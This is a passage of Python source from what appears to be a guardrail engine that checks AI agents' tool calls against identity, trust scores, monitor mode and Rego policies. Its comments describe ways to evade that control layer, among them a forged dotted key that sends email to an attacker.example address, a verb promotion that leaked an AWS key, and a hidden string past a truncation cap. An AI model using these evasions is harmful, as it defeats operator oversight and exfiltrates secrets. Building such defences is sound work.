        except InvalidSpiffeIdentity:
            elapsed_ms = (time.monotonic() - start) * 1000
            log.warning("nrvq.engine.invalid_identity", event_id=event.event_id, code="NRVQ-ENG-2006")
            decision = await self._soften_failure_for_posture(
                self._invalid_identity_decision(event, elapsed_ms), event
            )
            self._record_telemetry(event, decision, start, cache_hit, span, timer)
            # Register the agent on the FAIL-CLOSED path too. These three branches produce the blocks
            # that most strongly indicate an attack or an engine fault — a malformed/spoofed SPIFFE id,
            # or evaluations timing out — and none of them counted a violation or even created a
            # registry row, so an agent that ONLY ever trips them never appeared on the Agent Monitor
            # at all. Best-effort and fire-and-forget, exactly like the happy path: a registry write
            # must never turn a fail-closed block into an error.
            self._register_fail_closed(event, decision)
            return decision
        except Exception as exc:
            elapsed_ms = (time.monotonic() - start) * 1000
            log.error("nrvq.engine.error", event_id=event.event_id, error=str(exc), code="NRVQ-ENG-2000")
            decision = await self._soften_failure_for_posture(
                self._ensure_block_attribution(self._fallback_decision(event, elapsed_ms), event.event_id), event
            )
            self._record_telemetry(event, decision, start, cache_hit, span, timer)
            # Register the agent on the FAIL-CLOSED path too. These three branches produce the blocks
            # that most strongly indicate an attack or an engine fault — a malformed/spoofed SPIFFE id,
            # or evaluations timing out — and none of them counted a violation or even created a
            # registry row, so an agent that ONLY ever trips them never appeared on the Agent Monitor
            # at all. Best-effort and fire-and-forget, exactly like the happy path: a registry write
            # must never turn a fail-closed block into an error.
            self._register_fail_closed(event, decision)
            return decision
        finally:
            span.end()

    async def _soften_failure_for_posture(
        self, decision: PolicyDecision, event: ToolCallEvent
    ) -> PolicyDecision:
        """Apply namespace monitor mode to a decision minted on an EXCEPTION path.

        The three handlers in `evaluate()` build their decision and return it directly, so they never
        reached `_apply_posture` — the only three call sites are all on the happy path, above the
        `try`. The exempt set was narrowed so that `evaluator_timeout`, `evaluator_fallback` and
        `invalid_spiffe_identity` would soften, and it changed nothing for them: they are not softened
        because they are exempt, they are not softened because the softening never runs.

        That made monitor mode's promise false exactly where it matters most. A namespace configured
        to interrupt nothing still dropped customer traffic whenever OUR engine timed out or faulted —
        and an engine fault is the case an operator has least control over and most needs to survive.

        Resolving posture here can itself fail (Redis is often the reason we are in this handler at
        all). `_resolve_posture` already swallows a mirror error and falls back to the global posture,
        but this wraps it anyway: if we cannot establish that the customer asked for monitor, we must
        not assume it. Unknown posture keeps the hard verdict.
        """
        try:
            posture = await self._resolve_posture(event.agent_identity.namespace)
        except Exception as exc:  # noqa: BLE001 — cannot read the posture, so cannot claim monitor
            log.warning(
                "nrvq.engine.posture.unreadable_on_failure_path",
                event_id=event.event_id, error=str(exc), rule_id=decision.rule_id,
                code="NRVQ-ENG-2061",
            )
            return decision
        return self._apply_posture(decision, posture, event.event_id)

    def _register_fail_closed(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
        """Queue a registry write for a decision made on the fail-closed path.

        No trust was computed on these branches (that is why they are fail-closed), so the row carries
        the identity and the violation, not a recomputed score. Uses the same background queue as the
        happy path so it cannot add latency to a call that has already failed.
        """
        try:
            from norviq.engine.trust import TrustResult

            placeholder = TrustResult(
                score=0.0, category="low", signals={}, weights={},
                dominant_signal="fail_closed", recommendation=str(decision.rule_id or "fail_closed"),
            )
            self._queue_background(self._safe_register_agent(event, placeholder, decision))
        except Exception as exc:  # pragma: no cover - never let bookkeeping break a fail-closed block
            log.warning("nrvq.engine.fail_closed_register_failed", error=str(exc), code="NRVQ-ENG-2061")

    def _record_telemetry(
        self,
        event: ToolCallEvent,
        decision: PolicyDecision,
        start: float,
        cache_hit: bool,
        span,
        timer: PhaseTimer | None = None,
    ) -> None:
        """Record metrics and enrich traces for one evaluated tool call.

        `timer` is optional so every existing caller and test keeps working unchanged; when present the
        per-phase split is emitted alongside the total, which on its own only ever said THAT a call was
        slow and never which step it waited in.
        """
        latency_ms = (time.monotonic() - start) * 1000
        labels = {
            "namespace": event.agent_identity.namespace,
            "agent_class": event.agent_identity.agent_class,
            "tool_name": event.tool_name,
            "decision": decision.decision,
        }
        record_tool_call(labels, latency_ms, decision.trust_score, cache_hit)
        if timer is not None:
            record_eval_phases(event.agent_identity.namespace, timer.phases_ms(), timer.unattributed_ms())
        enrich_span(
            span,
            decision.decision,
            decision.trust_score,
            decision.rule_id,
            latency_ms,
            cache_hit,
            getattr(decision, "trust_signals", None),
        )

    async def _handle_cache_hit(
        self,
        event: ToolCallEvent,
        cached: PolicyDecision,
        start: float,
        trust_result: TrustResult,
        posture: dict,
    ) -> PolicyDecision:
        """Apply cache-hit controls before returning a cached decision."""
        # Throttle on the ALLOW footing (not just the no-policy `default_allow` rule) so the per-ns
        # rate_limit backstop applies to every explicitly-governed allow class too. rate_limit_exceeded is
        # exempt from monitor softening (a throttle is a resource control, not a policy decision) — the posture
        # pass inside _maybe_rate_limit leaves it untouched via _POSTURE_EXEMPT_RULES.
        throttled = await self._maybe_rate_limit(event, cached, start, posture)
        if throttled is not None:
            return throttled
        decision = self._apply_trust_overrides(cached, trust_result, event.event_id)
        decision = self._apply_posture(decision, posture, event.event_id)  # monitor mode
        log.debug("nrvq.engine.cache_hit", event_id=event.event_id, code="NRVQ-ENG-2004")
        return self._ensure_block_attribution(decision, event.event_id)

    async def _maybe_rate_limit(
        self, event: ToolCallEvent, base_decision: PolicyDecision, start: float, posture: dict
    ) -> PolicyDecision | None:
        """The per-namespace rate_limit is a namespace-wide DoS backstop, so it must throttle EVERY
        allowed call in the namespace — not only the no-policy `default_allow` class. Gate on the ALLOW decision
        (never block/escalate/audit — those are not resource grants and must not be flipped to a throttle),
        keeping the read-tool carve-out. Returns a posture-applied `rate_limit_exceeded` block when the
        window is exceeded, else None. Invoked from BOTH the cache-hit and fresh-eval paths so call #1 and
        non-cacheable allows are counted too; a single evaluate() traverses exactly one path, so the window
        counter increments exactly once per allowed non-exempt call."""
        if (base_decision.decision == "allow"
                and not self._is_rate_limit_exempt(event.tool_name)
                and await self._is_rate_limited(event.agent_identity.spiffe_id, posture["rate_limit"])):
            return self._apply_posture(
                await self._rate_limit_decision(event, start, posture["rate_limit"]), posture, event.event_id
            )
        return None

    async def _resolve_posture(self, namespace: str) -> dict:
        """Resolve a namespace's effective posture from the Redis mirror, per-field fallback
        to the global config. `monitor` is True ONLY when the namespace explicitly overrides enforcement_mode to
        'audit' — a null/global mode does NO softening (parity with today's weak global audit semantics, which only
        affect the no-policy default, never a real policy block). `trust_threshold` is None when unset so the trust
        calculator keeps its bit-identical literal 0.7/0.4 tiers. `rate_limit` never falls back to 0.

        Served from the per-pod posture L1 when warm: a posture change updates the Redis mirror and
        converges on every pod within the L1 TTL (the same bounded window as the eval cache)."""
        cached = self._posture_cache.get(namespace)
        if cached is not _MISS:
            return cached
        raw = None
        try:
            raw = await self._cache.get_ns_settings(namespace)
        except Exception as exc:  # noqa: BLE001 — a mirror read failure must never fail-closed; use global posture
            log.warning("nrvq.engine.posture.mirror_unavailable", namespace=namespace, error=str(exc),
                        code="NRVQ-ENG-2058")
        mode = raw.get("enforcement_mode") if raw else None
        thr = raw.get("trust_threshold") if raw else None
        rl = raw.get("rate_limit") if raw else None
        posture = {
            "monitor": mode == "audit",
            "trust_threshold": float(thr) if thr is not None else None,
            "rate_limit": int(rl) if rl is not None else settings.evaluator_rate_limit_per_window,
        }
        self._posture_cache.set(namespace, posture)
        return posture

    async def refresh_verb_overrides(self, rows) -> int:
        """Replace the in-proc promoted-verb map from `tool_verb_overrides` rows.

        Called at startup and after an admin promotes, NOT on the hot path — `_derived_input` is
        synchronous and must never await. Rows are (namespace, tool_name, verb) mappings; the caller owns
        the query so the engine keeps no DB dependency.

        Swapped whole rather than mutated in place: a partially-rebuilt map would briefly report the WRONG
        verb for a promoted tool, and a verb-gated deny-by-default policy would deny live traffic for the
        duration. Assignment is atomic under the GIL, so readers see either the old map or the new one.
        """
        rebuilt: dict[tuple[str, str], str] = {}
        for r in rows:
            ns = str(r["namespace"] if not hasattr(r, "namespace") else r.namespace)
            tool = str(r["tool_name"] if not hasattr(r, "tool_name") else r.tool_name)
            verb = str(r["verb"] if not hasattr(r, "verb") else r.verb)
            if ns and tool and verb:
                rebuilt[(ns, tool)] = verb
        self._verb_overrides = rebuilt
        log.info("nrvq.engine.verb_overrides.refreshed", count=len(rebuilt), code="NRVQ-ENG-2061")
        return len(rebuilt)

    def _apply_policy_mode(self, winner: dict, event_id: str) -> PolicyDecision:
        """Soften the winning policy's block/escalate to `audit` when THAT policy is saved in audit mode.

        Distinct from `_apply_posture`, which is the NAMESPACE-wide monitor switch. This is the per-policy
        mode the Catalog already renders as a badge: a policy saved with enforcement_mode="audit" showed
        an AUDIT chip and still hard-blocked, so the badge asserted something the engine did not do — the
        damaging kind of UI lie, because the operator believes they are trialling a rule safely.

        Applied BEFORE the eval-cache write, which is safe here even though posture deliberately is not:
        a policy write calls `_invalidate_eval_for_policy_scope` and publishes `norviq:policy:invalidated`
        to peer replicas, so flipping a policy's mode clears exactly the decisions it affected. Namespace
        posture has no such write hook, which is why it must stay a per-call override.

        Only BASE/FLOOR candidates carry a mode (see _collect_candidates) — overlays are excluded by
        construction, because an overlay may only TIGHTEN and honouring its mode would let an overlay
        weaken the base policy it sits on.

        Exempt rules stay hard, matching `_apply_posture`: an admin trust freeze is an incident-response
        kill switch that must outrank a policy's own mode, and the rate-limit throttle is a resource
        control rather than a judgement about the call.
        """
        decision = winner["decision"]
        if str(winner.get("enforcement_mode", "block")) != "audit":
            return decision
        if decision.decision not in ("block", "escalate"):
            return decision
        if decision.rule_id in _posture_exempt_rules():
            return decision
        log.info(
            "nrvq.engine.policy_mode.audit_softened",
            event_id=event_id,
            orig_decision=decision.decision,
            orig_rule=decision.rule_id,
            code="NRVQ-ENG-2060",
        )
        return decision.model_copy(update={
            "decision": "audit",
            "rule_id": f"{POLICY_AUDIT_WOULD_BLOCK_PREFIX}{decision.rule_id}",
        })

    def _apply_posture(self, decision: PolicyDecision, posture: dict, event_id: str) -> PolicyDecision:
        """Namespace monitor mode softens a would-block/escalate to an allow-but-log `audit`
        decision (visibility only). Fires ONLY on an explicit per-ns enforcement_mode='audit'. Never tightens.

        Monitor mode is a promise that nothing gets interrupted, so operational blocks — a cold replica
        (`policy_load_pending`), an OPA fault (`evaluator_error`), a malformed payload
        (`evaluator_invalid_payload`) — now soften like everything else. They used to stay hard, which
        meant a namespace configured specifically to not drop traffic still dropped it whenever OUR
        engine had a bad moment. See `_BASE_POSTURE_EXEMPT_RULES` for the two that remain and why."""
        if not posture.get("monitor"):
            return decision
        if decision.decision not in ("block", "escalate"):
            return decision
        if decision.rule_id in _posture_exempt_rules():
            return decision
        log.info("nrvq.engine.posture.monitor_softened", event_id=event_id, orig_decision=decision.decision,
                 orig_rule=decision.rule_id, code="NRVQ-ENG-2059")
        return decision.model_copy(update={
            "decision": "audit",
            "rule_id": f"{MONITOR_WOULD_BLOCK_PREFIX}{decision.rule_id}",
            "reason": f"Monitor mode (namespace audit): would {decision.decision} — {decision.reason}",
        })

    @staticmethod
    def _is_rate_limit_exempt(tool_name: str) -> bool:
        """Read-like tools are exempt from the per-identity rate limiter (benign read spike not denied)."""
        if not settings.evaluator_rate_limit_read_exempt:
            return False
        name = (tool_name or "").lower()
        if name.endswith("_status") or name.endswith("_read"):
            return True
        return any(name.startswith(p) for p in settings.evaluator_rate_limit_read_prefixes)

    @staticmethod
    def _ensure_block_attribution(decision: PolicyDecision, event_id: str) -> PolicyDecision:
        """A block must NEVER carry an empty or allow-rule rule_id (the audit/UI mislabels). The OTel span
        path is already correct; this clamps the persisted/audited decision and alarms if an unattributed block
        ever reaches here."""
        if decision.decision == "block" and decision.rule_id in ("", "default_allow"):
            log.warning("nrvq.engine.unattributed_block", event_id=event_id, prior_rule=decision.rule_id,
                        code="NRVQ-ENG-2057")
            return decision.model_copy(update={"rule_id": "unattributed_block",
                                               "reason": decision.reason or "Blocked (attribution unavailable)"})
        return decision

    async def _trust(self, spiffe_id: str) -> TrustScore:
        """Return trust score from cache, initializing when absent.

        Fronted by the per-pod trust-score L1 to skip the Redis GET on warm calls. This is the STORED
        score only (a status/display value that the per-call `TrustCalculator.calculate` recomputes
        fresh); serving it slightly stale never relaxes enforcement, and the freeze/cap kill-switch is
        read fresh inside the calculator regardless."""
        cached = self._trust_score_cache.get(spiffe_id)
        if cached is not _MISS:
            return cached
        trust = await self._cache.get_trust(spiffe_id)
        if trust is None:
            trust = TrustScore()
            await self._cache.set_trust(spiffe_id, trust)
        self._trust_score_cache.set(spiffe_id, trust)
        return trust

    def _on_eval_invalidated(self, namespace: str | None = None, agent_class: str | None = None) -> None:
        """Clear the WHOLE per-pod in-proc eval L1 on any eval-cache invalidation.

        Registered on the RedisCache, so it fires for every invalidation path — the loader chokepoint
        (origin-inline mutations AND peer pub/sub events) and packs.py's direct calls — with no call site able
        to miss it. Clearing the whole (small, per-pod) cache rather than a scoped subset is deliberate: it
        structurally cannot leak a stale decision across an overlay/base/pack scope mismatch, and policy events
        are rare enough that the re-warm cost is negligible."""
        _ = namespace, agent_class
        self._inproc_eval_cache.clear()

    def clear_inproc_eval(self) -> None:
        """Public hook to drop the in-proc eval L1 (used by tests + the embedded sidecar's invalidation)."""
        self._inproc_eval_cache.clear()

    async def _compute_trust(
        self,
        event: ToolCallEvent,
        trust: TrustScore,
        trust_threshold: float | None = None,
        prefetched_flags: tuple[bool, float | None] | None = None,
    ) -> TrustResult:
        """Compute trust from seven behavioral signals.

        `trust_threshold` (per-ns override, else None) moves the category tiers. The calculator also reads
        the durable admin trust CAP for this identity and applies it tighten-only. Both are
        threaded into the single categorize inside `calculate()` so there is exactly one recategorization site.
        `prefetched_flags = (is_frozen, cap)` forwards a freeze/cap the evaluator already read FRESH in the
        collapsed hot-path pipeline, so the calculator does not re-read them (still fresh, never cached)."""
        trust_input = TrustInput(
            spiffe_id=event.agent_identity.spiffe_id,
            namespace=event.agent_identity.namespace,
            agent_class=event.agent_identity.agent_class,
            tool_name=event.tool_name,
            tool_params=event.tool_params,
            session_id=event.session_id,
            chain_depth=event.call_depth,
            timestamp=datetime.now(timezone.utc),
        )
        return await self._trust_calculator.calculate(
            trust_input, trust_threshold=trust_threshold, prefetched_flags=prefetched_flags
        )

    def _apply_trust_overrides(self, decision: PolicyDecision, trust_result: TrustResult, event_id: str) -> PolicyDecision:
        """Apply low/frozen trust overrides to policy decision."""
        decision = decision.model_copy(
            update={
                "trust_score": trust_result.score,
                "trust_category": trust_result.category,
                "trust_signals": trust_result.signals,
                "trust_dominant_signal": trust_result.dominant_signal,
                "trust_recommendation": trust_result.recommendation,
                "decided_at": datetime.now(timezone.utc),
            }
        )
        if trust_result.category == "frozen":
            log.warning("nrvq.engine.trust.override_block", event_id=event_id, code="NRVQ-ENG-2046")
            # Name the rule_id so the audit attributes the block rather than the prior allow rule.
            return decision.model_copy(update={"decision": "block", "rule_id": "trust_frozen",
                                               "reason": "Agent trust frozen — all tool calls blocked"})
        if trust_result.category == "low" and decision.decision == "allow":
            reason = f"Low trust ({trust_result.score:.2f}): {trust_result.dominant_signal}"
            log.warning("nrvq.engine.trust.override_escalate", event_id=event_id, code="NRVQ-ENG-2045")
            # rule_id carries the override provenance (escalate_low_trust is non-cacheable).
            return decision.model_copy(
                update={"decision": "escalate", "rule_id": "escalate_low_trust", "reason": reason}
            )
        return decision

    # Total characters folded across ONE event's params. `skeleton()` runs NFKC/NFKD, and the caller
    # controls both the length of a string and how many of them there are.
    #
    # MEASURED before choosing the number, because the audit finding that prompted this overstated it
    # (it claimed ~219 ms and a 9.7 MB input from a 255 KiB body). On the reference host, 200k chars
    # costs 12 ms of ASCII, 13 ms of circled/fullwidth, and 39 ms of ligatures — the only shape that
    # expands, and only 3x (ﬃ -> ffi). With `max_request_body_bytes` at 256 KiB the real worst case is
    # roughly 40 ms and ~768 KiB, i.e. ~2% of the 2 s fail-closed budget: a cost worth bounding, not
    # the denial of service it was reported as.
    #
    # So this bound is not load-bearing today — it exists so that raising the body cap cannot silently
    # turn a 2% cost into a 20% one. It is set well above any reachable value, which is also why the
    # un-normalized tail is not an evasion window in practice: nothing that fits the body cap can
    # reach it.
    _NORMALIZE_MAX_CHARS = 4 * 1024 * 1024

    @classmethod
    def _normalize_for_match(cls, params: dict) -> dict:
        """Confusable-skeleton string values for injection MATCHING only (original preserved for audit)."""
        budget = cls._NORMALIZE_MAX_CHARS

        def _norm(value):
            nonlocal budget
            if isinstance(value, str):
                if budget <= 0:
                    # Past the bound the ORIGINAL is returned, not a truncation: rego matches against
                    # this document, and a half-folded string would be a value nobody sent.
                    return value
                budget -= len(value)
                return skeleton(value)
            if isinstance(value, list):
                return [_norm(v) for v in value]
            if isinstance(value, dict):
                return {k: _norm(v) for k, v in value.items()}
            return value

        return _norm(params)

    @staticmethod
    def _redacted_input(input_doc: dict) -> dict:
        """Mask tool_params before any log so raw PII/PAN/PHI can never reach a logger (PCI 3.4 / HIPAA)."""
        safe = dict(input_doc)
        if "tool_params" in safe:
            safe["tool_params"] = mask_params(safe.get("tool_params"))
        if "tool_params_normalized" in safe:
            safe["tool_params_normalized"] = mask_params(safe.get("tool_params_normalized"))
        return safe

    def _build_input(self, event: ToolCallEvent, trust_result: TrustResult) -> dict:
        """Build OPA input payload from tool event and trust state."""
        return {
            "tool_name": event.tool_name,
            # Confusable-skeleton of the tool NAME (homoglyph/zero-width evasion on the name itself,
            # e.g. Cyrillic "open_bгeaker"); rego matches control verbs/surface against this for parity.
            "tool_name_normalized": skeleton(event.tool_name),
            "tool_params": event.tool_params,
            # Matching-only confusable skeleton (homoglyph/zero-width evasion); rego scans this for injection.
            "tool_params_normalized": self._normalize_for_match(event.tool_params),
            "agent": {
                "spiffe_id": event.agent_identity.spiffe_id,
                "namespace": event.agent_identity.namespace,
                "agent_class": event.agent_identity.agent_class,
            },
            "trust_score": trust_result.score,
            "trust_category": trust_result.category,
            "session_id": event.session_id,
            "call_depth": event.call_depth,
            # Pre-computed primitives for USER-AUTHORED policies. The bundled presets carry their own
            # copies of this logic (walk/normalize/alias-match); a hand-written policy has no way to
            # reach it, because the engine evaluates every policy as a SINGLE self-contained module and
            # OPA here cannot import across packages (see tests/policies/test_horizontal_parity.py).
            # Shipping the primitives as INPUT sidesteps that entirely — no imports, module stays
            # self-contained — and closes the bypasses an allowlist policy otherwise has:
            #   param_values   -> a rule keyed on tool_params.query misses tool_params.sql
            #   tool_kind      -> a rule keyed on tool_name == "execute_sql" misses a renamed run_report
            #   sql_normalized -> "select * from orders " fails an exact match against the allowlist
            # Additive only: every existing policy reads tool_name/tool_params exactly as before.
            "derived": self._derived_input(event),
            # MCP protocol context, present only for calls that arrived over MCP (empty dict
            # otherwise, so the input document is byte-identical for every existing caller).
            #
            # This is what lets a policy reach Gate-A state without a per-call cost: the proxy has
            # already scanned and pin-checked the definition at DISCOVERY, so `input.mcp.pin_status`
            # and `input.mcp.scan_severity` are cached values riding along on a call that was going
            # to be evaluated anyway. It closes the gap where a drifted tool could only be handled by
            # the proxy's own hard-coded action, with no way for an operator to say "escalate instead
            # of block" or "block drift only for the payments class".
            #
            # See ToolCallEvent.mcp for the trust level: PEP-reported, exactly like tool_name.
            "mcp": getattr(event, "mcp", None) or {},
            # Which PLANE the call is on: call | answer | definition | content. Reported by the PEP
            # in the MCP context and lifted here so an intent can scope by direction without every
            # policy having to reach into `input.mcp`. Defaults to "call", so every caller that
            # predates the four-plane model stays governed by the call rules rather than escaping
            # every rule — the difference between a default and a hole.
            "direction": (getattr(event, "mcp", None) or {}).get("direction", "call"),
        }

    # Tools whose params carry SQL, matched by alias/verb rather than one exact name — a renamed
    # `run_report` carrying a query is still a SQL tool for allowlist purposes.
    _SQL_TOOL_NAMES = frozenset({"execute_sql", "run_sql", "query", "run_query", "sql", "db_query"})
    _SQL_TOOL_SUBSTRINGS = ("sql", "query", "report", "select")

    def _derived_input(self, event: ToolCallEvent) -> dict:
        """Flattened/normalized views of the call, for policies that must not depend on param naming."""
        values = [v for v in self._walk_values(event.tool_params) if isinstance(v, str)]
        paths, ambiguous_paths = self._walk_paths(event.tool_params)
        sql_like = self._sql_candidate(values)
        # The abstract operation this call performs — read / write / delete / send / unknown. Already
        # computed for the console's capability surfaces but never reachable from Rego, so "allow reads
        # on the vector store, block deletes" had to be written as an enumeration of tool names. That
        # enumeration is brittle in the dangerous direction under deny-by-default: a missed alias
        # (milvus_hybrid_search) does not leak, it locks out legitimate traffic.
        #
        # `unknown` is deliberately a FIRST-CLASS value a policy can match on, not a hidden default —
        # a policy that states what happens to unclassified tools beats one where it is implicit.
        # SECURITY: classification keys on the tool NAME, which the agent side controls, so
        # `allow { verb == "unknown" }` is a universal bypass for anything named unrecognisably.
        # Escalate (human review) is the intended handling; see the shipped template.
        # A PROMOTED verb is an admin's explicit, evidence-backed decision about what this tool does.
        # Without it the promotion is console-only: the Threats screen shows the tool as `delete`, and a
        # verb-gated policy still sees `unknown`, so promoting looks effective and changes nothing.
        #
        # IT MAY ONLY FILL IN AN UNKNOWN, NEVER CONTRADICT A CLASSIFICATION. The comment below used to
        # say the classifier "by construction returned UNKNOWN for anything that reached the promotion
        # queue in the first place" — true of the queue LISTING (threats.py skips tools classify_tool
        # resolves) but not of the write path, which validated only that the verb was one of
        # read/write/delete/send. So one POST could promote `slack_post_message` to `read`, and the
        # classified sink stopped being a sink: derived.verb == "read" satisfied `learned_read` and
        # falsified `is_egress` at the same time, and an AWS key went out through both baseline policies
        # as ("allow","default_allow") — the exact bypass this input was published to close, restored by
        # an admin action that reads like a labelling correction.
        #
        # So the classifier runs FIRST and wins whenever it is confident. The stated worst case now
        # actually holds: a promotion can only move a tool off `unknown`, never invent a verb that
        # grants access a classified tool would not have had. A promotion that contradicts the
        # classifier is ignored here rather than applied — an operator who believes the classifier is
        # wrong needs the classifier changed, not an override that silently weakens enforcement.
        #
        # getattr-guarded on BOTH sides: if the override map is not initialised, or the event carries no
        # identity, fall through to the classifier rather than raising. Degrading to classification is the
        # safe direction — the worst case is the pre-existing behaviour (an `unknown` verb, which a
        # deny-by-default policy denies).
        overrides = getattr(self, "_verb_overrides", None) or {}
        identity = getattr(event, "agent_identity", None)
        namespace = getattr(identity, "namespace", "") if identity is not None else ""
        verb, _risk = classify_tool(event.tool_name, event.tool_params)
        verb_value = verb.value
        promoted = overrides.get((namespace, event.tool_name))
        if promoted:
            # WHICH classification the promotion may not contradict is the NAME's, and testing
            # `verb_value == "unknown"` was the wrong test for it. `classify_tool` falls back to
            # inspecting TOOL_PARAMS when the name matches nothing, and tool_params is agent-supplied:
            # `acme_widget` promoted to `delete` came back as `read` the moment the caller added
            # `{"query": "select 1 from orders"}`, because the payload had then "classified" it and
            # the promotion was discarded. Measured. The promotion queue only ever offers tools whose
            # NAME did not resolve, so that is every promoted tool — one attacker-chosen argument
            # cancelled the admin's decision, in the weakening direction, which is the same defect as
            # the demotion this branch exists to stop.
            name_verb, _name_risk = classify_tool(event.tool_name)
            if name_verb.value == "unknown":
                # Name says nothing. The admin's promotion and the payload's own evidence are then two
                # readings of the same call and NEITHER may erase the other, so the more consequential
                # one is published: a `read` promotion cannot bury a DROP in the arguments, and a
                # `select` in the arguments cannot bury a `delete` promotion.
                verb_value = max((verb_value, promoted), key=lambda v: _PROMOTION_RANK.get(v, -1))
            # Name resolved: the classifier wins outright, whichever direction the promotion points.
            # Deliberately NOT max()-ed here — `milvus_search` promoted to `send` must stay `read`, or
            # a promotion becomes a way to move a tool INTO an egress refinement it has nothing to do
            # with. See test_a_promotion_cannot_demote_a_classified_tool_in_any_direction.
        return {
            # Risk is deliberately NOT exposed: it is a JUDGEMENT that shifts as the registry is
            # updated, so a policy pinned to it could change behaviour on an upgrade without the
            # policy changing. Verb is a stable fact about the call.
            "verb": verb_value,
            # Every string value anywhere in tool_params, nesting included.
            "param_values": values,
            "param_values_lower": [v.lower() for v in values],
            # Coarse kind so a policy can gate on WHAT the tool does, not what it is called.
            "tool_kind": self._tool_kind(event.tool_name),
            # Case-folded, whitespace-collapsed, trailing-semicolon-stripped — the form an exact-match
            # allowlist actually wants. Empty when the call carries nothing SQL-shaped.
            "sql_normalized": self._normalize_sql(sql_like) if sql_like else "",
            # Stacked statements split out, each normalized, so an allowlist can require ALL of them
            # to be approved rather than only the first.
            "sql_statements": [self._normalize_sql(p) for p in sql_like.split(";") if p.strip()] if sql_like else [],
            # -- scoping primitives (positive-security / intent policies) -------------------------
            #
            # `param_values` deliberately DISCARDS the key that held each value, which is exactly
            # right for a detector ("is a secret anywhere in this call") and exactly wrong for a
            # scope ("the RECIPIENT must be @acme.com"). Against a flat value list `to` and `body`
            # are indistinguishable, so the obvious rule matches a secret in the body as readily as
            # an address in the header. A dotted path -> value map restores the distinction without
            # making the policy author guess at nesting.
            #
            # Paths use dots for object keys and [i] for list indices: {"filters": {"ids": ["C-91"]}}
            # yields "filters.ids[0]".
            "param_paths": paths,
            # Paths whose value cannot be trusted to describe one unambiguous position in the payload:
            # a caller-minted key that another route also reaches, a zero-length key emitting its
            # children at the parent's level, two keys that render identically, and a value the walk
            # only read a PREFIX of. Published so a compiled constraint can refuse to hold over a path
            # it cannot trust, instead of reading the attacker's chosen value as compliant. Empty on an
            # honest call — including the ones with dotted or bracketed argument names, which is why
            # the mint test is aliasing rather than shape (see _mints_a_path).
            "param_paths_ambiguous": ambiguous_paths,
            # Egress targets, extracted once here rather than re-regexed inside every policy. Under
            # deny-by-default the destination IS the control: "may email acme.com" needs no detector
            # for what is being sent, which is the gap a detector list can never close (§11.5 — the
            # strict preset blocked a card number and let a real AWS key through to an attacker).
            "destinations": self._destinations(values, self._destination_keyed_hosts(event.tool_params)),
            # Classes of sensitive data carried by the REQUEST. Output DLP already masks responses;
            # nothing classified the outbound direction, so "this call must not carry a secret" was
            # unexpressible. Reuses the masking module's patterns rather than forking a second set.
            "data_classes": self._data_classes(event.tool_params, values),
            # Tables the SQL touches, so an intent can say `subsetOf: [orders, customers]` instead of
            # pinning an exact normalized statement (which breaks on any harmless edit).
            "sql_tables": self._sql_tables(sql_like) if sql_like else [],
            # Total size of the string payload — a cheap volume guard for an intent.
            "param_bytes": sum(len(v.encode("utf-8", "ignore")) for v in values),
        }

    # Bounds. The input document is built on every evaluation and is serialised to OPA, so each of
    # these is a hard cap rather than a heuristic: a hostile or merely enormous params object must not
    # be able to grow the document without limit. Matches the posture already documented for the Gate-A
    # scanner ("schema walks depth- and count-bounded; nothing grows with tool count").
    _MAX_PATH_DEPTH = 12
    _MAX_PATHS = 256
    _MAX_PATH_KEY_LEN = 256
    _MAX_PATH_VALUE_LEN = 4096
    _MAX_DESTINATIONS = 64

    def _walk_paths(self, node: object) -> tuple[dict, list[str]]:
        """Dotted path -> string value for every string leaf, plus the paths that are AMBIGUOUS.

        Non-string leaves are omitted for the same reason `param_values` drops them: a policy that
        matched the string "1" against an integer 1 would be matching a coincidence of formatting.

        WHY AMBIGUITY IS PUBLISHED. Keys come from the caller and the path grammar uses `.` and `[i]`
        as structure, so a caller-supplied key containing either can MINT a path that is
        indistinguishable from a genuinely nested one. That is not theoretical — it silently defeats
        the constraint:

            {"message": {"toRecipients": [{"emailAddress": {"address": "collector@attacker.example"}}]},
             "message.toRecipients[0].emailAddress.address": "ops@acme.com"}

        Both routes produce the key `message.toRecipients[0].emailAddress.address`; whichever the
        caller orders last wins the dict. A rule pinning that path to `^[^@]+@acme\\.com$` passed, and
        the near-miss explainer reported the compliant value, while the tool received the attacker's.

        Keys are still emitted VERBATIM — the original reasoning holds: an operator scopes against the
        path they saw in a dry-run, and silently rewriting keys would make the screen disagree with
        the policy. What changes is that a forged or colliding path is NAMED, so the compiler can
        refuse to let a constraint over it hold. Deriving nothing and deriving a lie must not be
        spelled the same way as deriving a compliant value.

        FOUR THINGS ARE NAMED, and each of them is a way the map could otherwise assert something the
        payload does not hold:
          * a minted key that ALIASES another route to the same path (_mints_a_path — note that a
            dotted or bracketed key with no such route is ORDINARY and is not named, or an OTel
            `http.method` attribute would be unscopable);
          * a zero-length key, which emits its children at the parent's own level (_mints_a_path);
          * two routes arriving at one path with different values, whoever looked suspicious;
          * a path the walk only read a PREFIX of — a key clipped at _MAX_PATH_KEY_LEN or a value
            clipped at _MAX_PATH_VALUE_LEN. `{"body": "A"*4096 + " the password is hunter2"}` published
            4096 clean characters, and `notMatches "(?i)password"` held over them while the tool
            received the whole string. A truncated read is "I could not derive this fact" wearing the
            costume of "the fact is compliant", which is the one thing this map must never do.
        """
        out: dict[str, str] = {}
        # Paths whose value cannot be trusted to describe one unambiguous position in the payload.
        ambiguous: set[str] = set()

        def walk(value: object, prefix: str, depth: int, forged: bool) -> None:
            if len(out) >= self._MAX_PATHS or depth > self._MAX_PATH_DEPTH:
                return
            if isinstance(value, dict):
                for key, child in value.items():
                    if len(out) >= self._MAX_PATHS:
                        return
                    text = str(key)
                    # A key that can assert a path some other route also reaches is self-forging:
                    # everything beneath it inherits the doubt, because the caller — not the structure
                    # — chose where the boundary falls.
                    child_forged = forged or _mints_a_path(text, value)
                    child_prefix = f"{prefix}.{text}" if prefix else text
                    # A key clipped by the length cap names a position that is not the one it came
                    # from, and two long keys sharing a prefix land on ONE path: same lie, different
                    # cause, so it carries the same doubt.
                    walk(child, child_prefix[: self._MAX_PATH_KEY_LEN], depth + 1,
                         child_forged or len(child_prefix) > self._MAX_PATH_KEY_LEN)
                return
            if isinstance(value, (list, tuple)):
                for index, child in enumerate(value):
                    if len(out) >= self._MAX_PATHS:
                        return
                    walk(child, f"{prefix}[{index}]", depth + 1, forged)
                return
            if isinstance(value, str) and prefix:
                clipped = value[: self._MAX_PATH_VALUE_LEN]
                # A second arrival at one path means two different routes produced it — the collision
                # itself, regardless of which key looked suspicious.
